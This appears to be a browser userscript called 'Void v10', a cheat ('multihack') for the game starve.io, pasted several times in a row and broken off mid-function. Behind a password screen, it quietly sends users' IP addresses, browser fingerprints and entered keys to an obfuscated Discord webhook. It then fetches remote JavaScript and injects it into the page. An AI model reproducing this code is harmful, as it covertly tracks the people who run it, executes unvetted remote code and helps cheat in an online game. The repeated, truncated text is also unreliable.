    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
